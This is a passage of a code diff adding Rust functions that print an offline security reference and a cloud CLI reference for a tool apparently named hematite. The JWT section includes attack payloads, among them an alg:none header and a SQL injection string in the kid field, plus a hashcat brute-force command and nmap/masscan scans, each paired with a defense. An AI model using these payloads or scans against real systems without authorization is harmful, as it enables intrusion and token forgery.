secret, when\n  - Dead-man's switch: alert when old secrets are still used post-rotation\n"
+    }
+    fn s_jwt_attacks() -> &'static str {
+        "  JWT common attacks and defenses:\n\n  Algorithm confusion (alg:none):\n  Attack:  Set alg to 'none'; strip signature\n  Payload: {\"alg\":\"none\"} in header; empty signature\n  Defense: Explicitly specify algorithm; reject 'none'\n\n  RS256 -> HS256 confusion:\n  Attack:  Server expects RS256; attacker changes header to HS256;\n           signs with the public key (which attacker knows)\n  Defense: Never accept algorithm from token header; configure strictly\n\n  JWT secret brute force:\n  hashcat -a 0 -m 16500 token.jwt wordlist.txt\n  Defense: Use secret >= 256 bits; prefer RS256/ES256 (asymmetric)\n\n  kid injection:\n  kid (key ID) header used to fetch signing key from DB\n  Inject SQL: {\"kid\": \"' UNION SELECT 'attacker-key'-- \"}\n  Defense: validate kid against allowlist; use parameterized lookup\n\n  Expired / not-before bypass:\n  exp and nbf claims ignored by vulnerable libs\n  Defense: always validate exp; use well-maintained JWT libraries\n\n  JWT best practices:\n  - Short expiry (15 min access token, longer refresh token)\n  - Include aud (audience) and iss (issuer); validate both\n  - Use jti (JWT ID) for one-time-use tokens\n  - Store access tokens in memory (not localStorage) to avoid XSS theft\n  - Use httpOnly cookies for refresh tokens\n  - Revocation: maintain a denylist of jti values for revoked tokens\n\n  Decode without verification (for debugging):\n  echo 'JWT' | cut -d'.' -f2 | base64 -d 2>/dev/null | python3 -m json.tool\n  jwt-cli decode <token>       (third-party CLI)\n"
+    }
+    fn s_scanning() -> &'static str {
+        "  Dependency / SCA scanning:\n  npm audit                    Built-in; check package.json deps\n  pip-audit                    Python dependencies\n  cargo audit                  Rust (install: cargo install cargo-audit)\n  trivy fs .                   Filesystem scan (langs + OS packages)\n  grype dir:.                  Anchore Grype; detailed CVE info\n  osv-scanner .                Google OSV database\n  snyk test                    Snyk CLI; free tier available\n\n  Container scanning:\n  trivy image myimage:tag\n  grype myimage:tag\n  docker scout cves myimage:tag\n\n  SAST (Static Analysis):\n  semgrep --config=auto .      Finds patterns + security bugs\n  bandit -r .                  Python security linter\n  gosec ./...                  Go security checker\n  cargo clippy -- -D warnings  Rust (catches some unsafe patterns)\n  eslint + security plugins    Node.js\n\n  Secret detection:\n  truffleHog3 --regex --entropy true .   Git history + filesystem\n  gitleaks detect               Scans git history\n  detect-secrets scan           Baseline + CI integration\n  git-secrets --scan            Prevent commits with secrets\n\n  Network scanning (authorized use only):\n  nmap -sV -sC target          Version + script scan\n  nmap -p- target              All 65535 ports\n  nmap -sU target              UDP scan\n  nmap --script vuln target    Vulnerability scripts\n  masscan -p1-65535 target --rate=10000  Faster port scan\n"
+    }
+
+    type SecRefSection = (&'static str, &'static [&'static str], fn() -> &'static str);
+    const SECTIONS: &[SecRefSection] = &[
+        (
+            "owasp",
+            &[
+                "owasp",
+                "top10",
+                "access-control",
+                "misconfiguration",
+                "ssrf",
+                "sqli",
+            ],
+            s_owasp,
+        ),
+        (
+            "injection",
+            &[
+                "injection",
+                "sqli",
+                "xss",
+                "ssti",
+                "command",
+                "path",
+                "xxe",
+                "traversal",
+            ],
+            s_injection,
+        ),
+        (
+            "tls",
+            &[
+                "tls",
+                "ssl",
+                "cipher",
+                "certificate",
+                "hsts",
+                "protocol",
+                "https",
+            ],
+            s_tls,
+        ),
+        (
+            "secrets",
+            &[
+                "secret",
+                "secrets",
+                "vault",
+                "rotate",
+                "env-var",
+                "kubernetes-secret",
+            ],
+            s_secrets,
+        ),
+        (
+            "jwt",
+            &["jwt", "token", "alg", "none-alg", "kid", "claims", "bearer"],
+            s_jwt_attacks,
+        ),
+        (
+            "scanning",
+            &[
+                "scan", "scanning", "sca", "sast", "audit", "trivy", "semgrep", "grype",
+            ],
+            s_scanning,
+        ),
+    ];
+
+    let q = query.trim().to_lowercase();
+
+    if q.is_empty() || q == "help" || q == "list" {
+        let _ = writeln!(out, "{sep}");
+        let _ = writeln!(out, "  hematite --security-ref <TOPIC>");
+        let _ = writeln!(
+            out,
+            "  Offline security reference — OWASP, TLS, JWT, secrets, scanning"
+        );
+        let _ = writeln!(out, "{sep}");
+        let _ = writeln!(out, "  Topics:");
+        for &(name, aliases, _) in SECTIONS {
+            let _ = writeln!(out, "    {name:<10} ({})", aliases.join(", "));
+        }
+        let _ = writeln!(out, "\n  hematite --security-ref all   -- print everything");
+        let _ = writeln!(out, "{sep}");
+        return out;
+    }
+
+    if q == "all" {
+        let _ = writeln!(out, "{sep}");
+        for &(name, _, f) in SECTIONS {
+            let _ = writeln!(
+                out,
+                "  -- {name} {}",
+                "-".repeat(50usize.saturating_sub(name.len() + 4))
+            );
+            let _ = write!(out, "{}", f());
+            let _ = writeln!(out, "");
+        }
+        let _ = writeln!(out, "{sep}");
+        return out;
+    }
+
+    let found: Vec<_> = SECTIONS
+        .iter()
+        .filter(|&&(name, aliases, _)| {
+            name.contains(q.as_str())
+                || aliases
+                    .iter()
+                    .any(|&a| a.contains(q.as_str()) || q.contains(a))
+        })
+        .collect();
+
+    if found.is_empty() {
+        let _ = writeln!(out, "  No topic found for '{}'.", query.trim());
+        let _ = writeln!(out, "  Run: hematite --security-ref help");
+    } else {
+        let _ = writeln!(out, "{sep}");
+        for &&(name, _, f) in &found {
+            let _ = writeln!(
+                out,
+                "  -- {name} {}",
+                "-".repeat(50usize.saturating_sub(name.len() + 4))
+            );
+            let _ = write!(out, "{}", f());
+        }
+        let _ = writeln!(out, "{sep}");
+    }
+    out
+}
+
+pub fn cloud_ref_calc(query: &str) -> String {
+    use std::fmt::Write as _;
+    let mut out = String::new();
+    let sep = "─".repeat(60);
+
+    fn s_aws() -> &'static str {
+        "  AWS CLI essentials:\n  aws configure                     Set default region, creds, output\n  aws configure --profile myprofile\n  aws sts get-caller-identity        Who am I? (account, ARN, UserId)\n  AWS_PROFILE=myprofile aws s3 ls\n\n  S3:\n  aws s3 ls\n  aws s3 ls s3://mybucket/prefix/\n  aws s3 cp file.txt s3://mybucket/path/\n  aws s3 cp s3://mybucket/file.txt .\n  aws s3 sync ./local s3://mybucket/prefix/ --delete\n  aws s3 sync s3://mybucket/prefix/ ./local\n  aws s3 presign s3://mybucket/file.txt --expires-in 3600\n  aws s3 mb s3://mybucket --region us-east-1\n  aws s3 rb s3://mybucket --force\n  aws s3api put-bucket-versioning --bucket mybucket \\\n    --versioning-configuration Status=Enabled\n\n  EC2:\n  aws ec2 describe-instances --query 'Reservations[*].Instances[*].[InstanceId,State.Name,PublicIpAddress]' --output table\n  aws ec2 start-instances --instance-ids i-1234567890\n  aws ec2 stop-instances --instance-ids i-1234567890\n  aws ec2 describe-security-groups --group-ids sg-12345\n  aws ec2 describe-vpcs\n  aws ec2 describe-subnets --filters 'Name=vpc-id,Values=vpc-12345'\n\n  ECS / Fargate:\n  aws ecs list-clusters\n  aws ecs list-services --cluster mycluster\n  aws ecs describe-tasks --cluster mycluster --tasks task-arn\n  aws ecs execute-command --cluster mycluster --task task-arn \\\n    --container mycontainer --interactive --command /bin/sh\n\n  Lambda:\n  aws lambda invoke --function-name myFunc output.json\n  aws lambda invoke --function-name myFunc \\\n    --payload '{}' --cli-binary-format raw-in-base64-out output.json\n  aws lambda list-functions --query 'Functions[*].[FunctionName,Runtime]' --output table\n  aws logs tail /aws/lambda/myFunc --follow\n\n  IAM:\n  aws iam get-user\n  aws iam list-roles --query 'Roles[*].[RoleName,Arn]' --output table\n  aws iam create-role --role-name myrole --assume-role-policy-document file://trust.json\n  aws iam attach-role-policy --role-name myrole --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n"
+    }
+    fn s_gcp() -> &'static str {
+        "  GCP CLI (gcloud) essentials:\n  gcloud auth login\n  gcloud auth application-default login   (for SDK/local dev)\n  gcloud config set project my-project-id\n  gcloud config get-value project\n  gcloud config configurations list\n  gcloud config configurations activate myconfig\n  gcloud auth list\n  gcloud projects list\n\n  Compute Engine:\n  gcloud compute instances list\n  gcloud compute instances start/stop myvm --zone us-central1-a\n  gcloud compute ssh myvm --zone us-central1-a\n  gcloud compute instances create myvm --machine-type=e2-medium \\\n    --image-family=debian-12 --image-project=debian-cloud --zone=us-central1-a\n  gcloud compute firewall-rules list\n\n  GCS (Cloud Storage):\n  gsutil ls\n  gsutil ls gs://mybucket/\n  gsutil cp file.txt gs://mybucket/\n  gsutil cp gs://mybucket/file.txt .\n  gsutil rsync -r ./local gs://mybucket/prefix\n  gsutil signurl -d 1h key.json gs://mybucket/file.txt\n\n  Cloud Run:\n  gcloud run services list\n  gcloud run deploy myservice --image gcr.io/myproject/myimage:tag \\\n    --region us-central1 --allow-unauthenticated\n  gcloud run services describe myservice --region us-central1\n  gcloud run services update-traffic myservice --to-latest --region us-central1\n\n  Cloud Functions:\n  gcloud functions deploy myFunc --runtime nodejs20 --trigger-http \\\n    --entry-point=handler --region us-central1\n  gcloud functions call myFunc --data '{\"key\":\"value\"}'\n  gcloud functions logs read myFunc\n\n  Artifact Registry / Container Registry:\n  gcloud auth configure-docker us-central1-docker.pkg.dev\n  docker push us-central1-docker.pkg.dev/myproject/myrepo/myimage:tag\n  gcloud artifacts repositories list\n"
+    }
+    fn s_azure() -> &'static str {
+        "  Azure CLI (az) essentials:\n  az login\n  az login --use-device-code       (headless / CI)\n  az account show\n  az account list --output table\n  az account set --subscription \"My Sub\"\n  az configure --defaults group=myRG location=eastus\n\n  Resource Groups:\n  az group list --output table\n  az group create --name myRG --location eastus\n  az group delete --name myRG --yes\n\n  App Service:\n  az webapp list --output table\n  az webapp create --name myapp --resource-group myRG \\\n    --plan myPlan --runtime \"NODE:20-lts\"\n  az webapp restart --name myapp --resource-group myRG\n  az webapp log tail --name myapp --resource-group myRG\n  az webapp config appsettings set --name myapp \\\n    --resource-group myRG --settings KEY=VALUE\n\n  Container Instances:\n  az container create --resource-group myRG --name mycontainer \\\n    --image nginx --dns-name-label mydns --ports 80\n  az container logs --resource-group myRG --name mycontainer\n  az container exec --resource-group myRG --name mycontainer \\\n    --container-name mycontainer --exec-command /bin/sh\n\n  Azure Container Registry (ACR):\n  az acr login --name myregistry\n  az acr list --output table\n  az acr repository list --name myregistry\n  docker push myregistry.azurecr.io/myimage:tag\n\n  Key Vault:\n  az keyvault secret set --vault-name MyVault --name MySecret --value \"abc\"\n  az keyvault secret show --vault-name MyVault --name MySecret --query value\n  az keyvault secret list --vault-name MyVault\n\n  AKS (Kubernetes):\n  az aks get-credentials --resource-group myRG --name myAKS\n  az aks list --output table\n  az aks nodepool list --resource-group myRG --cluster-name myAKS\n"
+    }
+    fn s_iam() -> &'static str {
+        "  IAM / RBAC patterns:\n\n  Principle of least privilege:\n  - Grant minimum permissions needed for the task\n  - Prefer roles over users (allow role assumption)\n  - Use short-lived credentials (STS assume-role, OIDC, Workload Identity)\n  - Regularly audit and remove unused permissions\n\n  AWS IAM policy structure:\n  {\n    \"Version\": \"2012-10-17\",\n    \"Statement\": [{\n      \"Effect\": \"Allow\",\n      \"Action\": [\"s3:GetObject\", \"s3:PutObject\"],\n      \"Resource\": \"arn:aws:s3:::mybucket/*\",\n      \"Condition\": {\n        \"StringEquals\": { \"aws:RequestedRegion\": \"us-east-1\" }\n      }\n    }]\n  }\n\n  AWS: Assume role (temporary credentials):\n  aws sts assume-role --role-arn arn:aws:iam::123456789:role/MyRole \\\n    --role-session-name mysession\n  # Returns AccessKeyId, SecretAccessKey, SessionToken\n  # Export and use for scoped access\n\n  AWS: Resource-based vs Identity-based policies:\n  Identity-based: attached to user/role; what they can do\n  Resource-based: attached to S3 bucket/SQS queue/Lambda; who can access it\n\n  GCP IAM:\n  gcloud projects add-iam-policy-binding myproject \\\n    --member serviceAccount:sa@myproject.iam.gserviceaccount.com \\\n    --role roles/storage.objectViewer\n  gcloud iam roles list --project=myproject\n  gcloud iam service-accounts list\n\n  Azure RBAC:\n  az role assignment create --assignee user@domain.com \\\n    --role \"Storage Blob Data Reader\" --scope /subscriptions/SUB/resourceGroups/RG\n  az role assignment list --assignee user@domain.com\n  az role definition list --query '[*].roleName' --output tsv | grep -i storage\n"
+    }
+    fn s_k8s_cloud() -> &'static str {
+        "  Managed Kubernetes — common operations:\n\n  EKS (AWS):\n  eksctl create cluster --name mycluster --region us-east-1 --nodegroup-name standard \\\n    --node-type t3.medium --nodes 3\n  aws eks update-kubeconfig --name mycluster --region us-east-1\n  eksctl get nodegroup --cluster mycluster\n  eksctl scale nodegroup --cluster mycluster --name standard --nodes 5\n\n  GKE (GCP):\n  gcloud container clusters create mycluster --zone us-central1-a --num-nodes 3\n  gcloud container clusters get-credentials mycluster --zone us-central1-a\n  gcloud container clusters resize mycluster --node-pool default-pool --num-nodes 5\n\n  AKS (Azure):\n  az aks create --resource-group myRG --name myAKS --node-count 3 --generate-ssh-keys\n  az aks get-credentials --resource-group myRG --name myAKS\n  az aks scale --resource-group myRG --name myAKS --node-count 5\n\n  Multi-cluster kubeconfig:\n  kubectl config get-contexts\n  kubectl config use-context my-prod-context\n  kubectl config current-context\n  KUBECONFIG=~/.kube/config-cluster1:~/.kube/config-cluster2 kubectl config view --merge --flatten\n\n  Cloud-native storage:\n  AWS EBS CSI driver: StorageClass gp3, io2\n  GCP Persistent Disk CSI: pd-ssd, pd-standard\n  Azure Disk CSI: managed-premium, managed-csi\n  All support: ReadWriteOnce (RWO) for block storage\n  AWS EFS / GCP Filestore / Azure Files: ReadWriteMany (RWX)\n"
+    }
+
+    type CloudRefSection = (&'static str, &'static [&'static str], fn() -> &'static str);
+    const SECTIONS: &[CloudRefSection] = &[
+        (
+            "aws",
+            &["aws", "s3", "ec2", "lambda", "ecs", "fargate", "cloudwatch"],
+            s_aws,
+        ),
+        (
+            "gcp",
+            &[
+                "gcp",
+                "gcloud",
+                "gsutil",
+                "cloud-run",
+                "gke",
+                "gcr",
+                "artifact",
+            ],
+            s_gcp,
+        ),
+        (
+            "azure",
+            &["azure", "az-cli", "aks", "acr", "keyvault", "app-service"],
+            s_azure,
+        ),
+        (
+            "iam",
+            &[
+                "iam",
+                "rbac",
+                "role",
+                "policy",
+                "permission",
+                "assume-role",
+                "workload",
+            ],
+            s_iam,
+        ),
+        (
+            "k8s-cloud",
+            &[
+                "eks",
+                "managed",
+                "multi-cluster",
+                "kubeconfig",
+                "csi",
+                "storage-class",
+            ],
+            s_k8s_cloud,
+        ),
+    ];
+
+    let q = query.trim().to_lowercase();
+
+    if q.is_empty() || q == "help" || q == "list" {
+        let _ = writeln!(out, "{sep}");
+        let _ = writeln!(out, "  hematite --cloud-ref <TOPIC>");
+        let _ = writeln!(
+            out,
+            "  Offline cloud CLI reference — AWS, GCP, Azure, IAM, managed K8s"
+        );
+        let _ = writeln!(out, "{sep}");
+        let _ = writeln!(out, "  Topics:");
+        for &(name, aliases, _) in SECTIONS {
+            let _ = writeln!(out, "    {name:<12} ({})", aliases.join(", "));
+        }
+        let _ = writeln!(out, "\n  hematite --cloud-ref all   -- print everything");
+        let _ = writeln!(out, "{sep}");
+        return out;
+    }
+
+    if q == "all" {
+        let _ = writeln!(out, "{sep}");
+        for &(name, _, f) in SECTIONS {
+            let _ = writeln!(
+                out,
+                "  -- {name} {}",
+                "-".repeat(50usize.saturating_sub(name.len() + 4))
+            );
+            let _ = write!(out, "{}", f());
+            let _ = writeln!(out, "");
+        }
+        let _ = writeln!(out, "{sep}");
+        return out;
+    }
+
+    let found: Vec<_> = SECTIONS
+        .iter()
+        .filter(|&&(name, aliases, _)| {
+            name.contains(q.as_str())
+                || aliases
+                    .iter()
+                    .any(|&a| a.contains(q.as_str()) || q.contains(a))
+        })
+        .collect();
+
+    if found.is_empty() {
+        let _ = writeln!(out, "  No topic found for '{}'.", query.trim());
+        let _ = writeln!(out, "  Run: hematite --cloud-ref help");
+    } else {
+        let _ = writeln!(out, "{sep}");
+        for &&(name, _, f) in &found {
+            let _ = writeln!(
+                out,
+                "  -- {name} {}",
+                "-".repeat(50usize.saturating_sub(name.len() + 4))
+            );
+            let _ = write!(out, "{}", f());
+        }
+        let _ = writeln!(out, "{sep}");
+    }
+    out
+}
